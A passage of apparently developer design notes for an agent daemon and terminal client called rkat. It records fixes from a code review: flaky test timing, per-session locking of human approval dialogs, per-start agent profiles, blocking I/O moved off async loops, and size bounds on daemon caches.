`attach::each_client_marks_only_its_own_steer_delivered` (each client
sees one `TurnFinished`, after its mark, and the client that did not send
the follow-up's steer shows its text inside the turn).

Two more hosted failures after a2bbba0, both timing assumptions in tests:
`agents::a_new_agent_attaches_while_another_agents_helper_runs`
asserted that a new agent's attach takes under 5 s while another agent's
helper is held on a gate; the loaded runner took 6.1 s (0.73 s locally
with one test thread; 8.3 s for the whole test on c7ef0e9, before any of
these changes). The attach runs while the other agent's run is open, so
the turn-end rule above asks nothing yet. The test's proof is that the
attach returns while the helper's gate is still shut (a waiting attach
could not return), so the time bound went and the wait is only the
rig's own. `schedules::a_fired_schedule_is_unattended_while_nobody_is_attached`
attached its second client right after the scheduled run's last model
call; when that run had not ended yet the client joined it as a remote
turn and took its end for its own turn's. It now waits for the agent to
be idle at the daemon first (`Running::idle`, bounded). Even then the
client catches up on the run it missed (its cursor predates it) and shows
it as a turn that ends; the test sent its next prompt straight into the
runner while that caught-up turn was open, which a UI never does (it
queues), so either turn's end could come first. The test now waits for
the caught-up turn's end ("fetched a") and checks it was shown as a
turn, then starts its own.

## Escalations are serialized per session (A1 of senior review 3, 2026-11-11)

`EscalationBroker` held one async mutex for every escalation of the
daemon, and each escalation's budget (the 10-minute escalation timeout)
started when it entered that queue. The desk offers every held decision
to every client (`decisions.rs` `offer_all`), but a client shows a dialog
only for its own agent's session (`client/approvals.rs` `notice`). With
two agents, B's question waited behind A's open dialog without being
held as a decision (the desk holds one only once the lock is taken), so
no terminal showed it, and it was denied "the user did not answer" when
its budget ran out in the queue.

The broker now keeps one lock per session (a helper's call already
carries its owner's session, `admission.rs`), dropped once nobody holds
or waits for it. A call's budget runs while its dialog is shown. To keep
a walked-away human from costing N budgets for N parallel calls of one
agent, a lock remembers when its last dialog went unanswered for its
whole budget, and a call that queued before that is denied as timed out
without being shown (so `parallel_escalations_share_one_timeout_including_the_queue`
holds unchanged: five unanswered calls end after about one budget, one
shown). A call queued behind an answered dialog gets its own whole budget.

Tests: `approval::escalation::tests::another_sessions_ask_is_not_held_by_an_open_dialog`,
`approval::engine::tests::another_sessions_escalation_is_not_held_by_an_open_dialog`,
`approval::engine::tests::a_queued_escalation_s_budget_runs_from_when_it_is_shown`
(paused clock: shown after 0.9 of a budget in the queue, answered half a
budget later, allowed) and, on the rig,
`agents::each_agents_question_is_shown_on_its_client_while_another_is_open`
(A's dialog left open on A's client, B's shown on B's and answered, then
A's). With the lock made daemon-wide again the three "another session"
tests fail (checked).

## The agents follow each start's profile (A8 of senior review 3, 2026-11-11)

`ensure_mob` creates the workspace's mob from `definition(plan)` once
per realm and only resumes it on later starts, so the stored `main`
profile kept the MCP servers, the memory flag and the compaction
threshold of the realm's first start. The engine's way to change a
stored definition is `MobStorage::update_definition(expected_revision,
definition)`, documented "call this before constructing/resuming a
`MobHandle`"; `MobMcpState` opens the storage itself (its path is
internal, `storage_for_new_mob`) and restores the mob while listing, and
exposes no update. `mob_profile_update` is the realm profile store, not
a mob's inline profiles. What the spawn path does take is
`SpawnMemberSpec::override_profile`: the spawn builds on that profile
instead of the definition's, the actor persists it as the member's
`effective_profile_override`, and a restore or rebuild uses the one the
customizer hands it (the definition's current role profile still adds
its deny list and read-only flag, `build.rs`). A resumed session keeps
its persisted identity (model, provider, provider params, unless
`resume_provider_params`).

So `orchestrator::main_profile(plan)` builds the profile of this start,
`definition` uses it for a new mob, and `RootMember::current_profile`
carries it to the customizer, which sets it as the override profile of
every agent's spawn and rebuild. Limit, stated in the code: the stored
definition itself still shows the first start's profile (only the
members follow), which nothing in rkat-tui reads.

Test: `compact::a_changed_compaction_policy_reaches_an_existing_realms_agent`
(first start in `warn`, history past the threshold, nothing compacts;
second start of the same realm and conversation in `auto` at 5%: the
next turn compacts first). It failed before the change (the second
start answered with the summary text: no compaction).

A later full gate failed `approvals::auto_mode_needs_no_dialog_and_plan_mode_refuses_writes`
once (not reproduced in eight runs, alone and with its binaries in
parallel): the plan-mode note was missing from the next turn's first
request. The note is appended with `mob_append_system_context`, which the
engine applies to a member whose run is still closing only when that
turn ends. With the turn-end rule above a client could end its turn as
soon as no input was unfinished, possibly while the runtime was still
closing the run, so a `/mode` right after a turn could land a turn late.
`rkat/active_inputs` now also counts a run still open (or a state it
cannot read) as unfinished: a client's turn ends when the agent is idle.

## Blocking I/O off the async loops (A7 of senior review 3, 2026-11-11)

- `Conversations::touch` (every prompt and steer, from the proxy's line
  loop) changes the log in memory and hands the serialized log to a
  blocking task. Every write carries the order in which its log was
  serialized under the log's lock, and `LogWriter` drops a write older
  than the last one written, so an inline write (`record`, `forget`) and
  a late blocking one cannot put an older log back. The daemon's stop
  writes the log as it is (`flush_conversations`), so the next start
  reads the last order. Test:
  `daemon::conversations::tests::an_older_log_write_never_replaces_a_newer_one`.
- `rkat/rules`, `rkat/set_mode`'s save and `rkat/checklist_view` run their
  realm-file read-modify-write in `spawn_blocking` (the realm file's lock
  from the previous change serializes them).
- A scheduled run's cost is counted in memory on the event watcher and
  its record written behind by one blocking writer at a time, each of the
  latest count; `/schedules` reads the count, so it never shows a stale
  file.
- The TUI's cost record (one write with an fsync per model call, on the
  runner's loop): the newest snapshot of each record waits in
  `CostWriter` until a blocking task writes it, and a read meanwhile is
  answered from it. Test:
  `workbench::cost::tests::the_newest_snapshot_is_read_back_and_written`.
- `link::probe_address`, polled every 100 ms by `daemon_ended`, used the
  blocking `std::net::TcpStream::connect_timeout` (up to 1 s) on the
  runtime thread; it is a `tokio` connect under a 1 s timeout now. Test:
  `client::runner::tests::the_address_probe_tells_a_listener_from_a_closed_port`.

Not measured: how long each of these blocked before (the review's
estimate: milliseconds to tens of milliseconds per fsync).

## Bounded daemon maps (A10 of senior review 3, 2026-11-11)

- `DaemonToolOrigins.cache`: a forgotten session's catalog is dropped (a
  forget hook beside the registry's) and the cache keeps at most
  `MAX_CATALOGS` (256), the one read longest ago going first; a session
  whose catalog went is judged by the known tools until its next run end
  reads it again (foreign tools reviewed: the safe direction). Helper
  sessions are not forgotten by the engine, so the bound is what holds
  them.
- The file tools' `read_state`: at most `MAX_READ_RECORDS` (4096), oldest
  first (`tools::keep_newest`, tested); a write to a file whose record
  went asks for it to be read again.
- `Schedules.runs`: a run's attribution goes at its `RunCompleted` or
  `RunFailed`. `Schedules.attributed`: at most `MAX_ATTRIBUTED` (1024);
  every occurrence dispatched no later than a forgotten one is never
  attributed again, so a forgotten one cannot be taken for a new run's
  (`forgotten_occurrences_are_never_attributed_again`).
- `HelperRegistry.councils`: `expect_council` does not overwrite a live
  entry (a second call naming the same `council_id` is refused its
  participants instead of taking the first convener's), and a council
  call whose dispatch outcome is `Failed` drops its entry
  (`a_council_entry_is_not_taken_over_and_goes_when_its_call_failed`;
  the `Convening` glue that calls it on `record_dispatch_outcome` is not
  covered by a test of its own).
